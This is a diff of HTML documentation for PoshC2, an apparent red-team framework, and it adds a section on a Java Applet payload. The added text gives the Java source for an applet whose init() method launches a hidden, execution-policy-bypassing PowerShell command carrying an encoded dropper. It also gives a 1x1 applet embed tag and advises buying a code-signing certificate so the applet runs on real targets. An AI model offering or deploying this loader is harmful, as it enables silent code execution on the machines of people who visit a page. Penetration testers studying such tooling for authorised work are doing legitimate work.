@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -178,6 +179,46 @@
             
   <div class="section" id="java-applet">
 <h1>Java Applet<a class="headerlink" href="#java-applet" title="Permalink to this headline">¶</a></h1>
+<p>With the latest security updates applied to Java, the only real avenue of attack using a Java Applet is if the jar is signed. PoshC2 creates a Java Applet and an accompanying html document where the Jar is embedded, however, leaves the Applet unsigned. It is highly recommended that if using this payload on a real engagement you purchase a code signing certifcate that can sign Java Applets. This Jar file can be called by either embedding as a Java Applet in a webpage or used on the command line using the following command:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Java</span> <span class="o">-</span><span class="n">Jar</span> <span class="n">PoshC2</span><span class="o">.</span><span class="n">jar</span>
+</pre></div>
+</div>
+<p>Otherwise the file should be hosted on a webpage and embedded using the following HTML code:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">applet</span> <span class="n">code</span><span class="o">=</span><span class="s2">&quot;JavaPS&quot;</span> <span class="n">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="n">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="n">archive</span><span class="o">=</span><span class="s2">&quot;JavaPS.jar&quot;</span><span class="o">&gt;&lt;/</span><span class="n">applet</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>The Java code to execute “powershell.exe” is as follows:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.applet.</span><span class="o">*</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.</span><span class="o">*</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span> <span class="nc">JavaPS</span> <span class="n">extends</span> <span class="n">Applet</span> <span class="p">{</span>
+
+  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">foobar</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">Process</span> <span class="n">a</span><span class="p">;</span>
+    <span class="n">String</span> <span class="n">b</span> <span class="o">=</span> <span class="s2">&quot;powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e &lt;encoded core dropper&gt;&quot;</span><span class="p">;</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Running Java&quot;</span><span class="p">);</span>
+      <span class="n">a</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">catch</span><span class="p">(</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
+      <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+    <span class="p">}</span>
+
+  <span class="p">}</span>
+
+  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">foobar</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="n">public</span> <span class="n">void</span> <span class="n">init</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">foobar</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
 </div>
 
 
